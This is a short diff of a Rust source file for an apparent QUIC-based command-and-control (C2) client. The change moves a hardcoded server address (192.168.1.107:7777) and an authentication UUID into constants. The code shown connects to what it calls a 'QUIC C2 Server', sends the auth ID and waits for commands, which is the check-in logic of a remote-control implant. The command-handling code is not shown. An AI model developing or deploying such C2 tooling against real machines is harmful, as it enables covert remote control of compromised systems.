@@ -11,6 +11,12 @@ use std::path::Path;
 use std::sync::Arc;
 
 
+
+const HOST: &str = "192.168.1.107";
+const PORT: u16 = 7777;
+const AUTH_ID: &str = "eb3788e3-b07c-467a-b76b-d5e1b0e6afac";
+
+
 #[cfg(windows)]
 mod winapi {
     use std::ffi::OsStr;
@@ -429,21 +435,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     println!("[*] Starting QUIC Client...");
 
-    let host = "192.168.1.107";
-    let port: u16 = 7777;
-    let auth_id = "371df020-0315-455e-a332-d4e41e837f5f";
-
     let client_cfg = configure_client();
     let mut endpoint = Endpoint::client("0.0.0.0:0".parse()?)?;
     endpoint.set_default_client_config(client_cfg);
 
-    let addr = format!("{}:{}", host, port).parse()?;
-    let connection = endpoint.connect(addr, host)?.await?;
+    let addr = format!("{}:{}", HOST, PORT).parse()?;
+    let connection = endpoint.connect(addr, HOST)?.await?;
     println!("[+] Connected to QUIC C2 Server.");
-    println!("[+] Auth ID: {}", auth_id);
+    println!("[+] Auth ID: {}", AUTH_ID);
 
     let (mut auth_send, _auth_recv) = connection.open_bi().await?;
-    tokio::io::AsyncWriteExt::write_all(&mut auth_send, auth_id.as_bytes()).await?;
+    tokio::io::AsyncWriteExt::write_all(&mut auth_send, AUTH_ID.as_bytes()).await?;
     auth_send.finish()?;
 
     println!("[+] AUTH_ID sent, waiting for commands...");
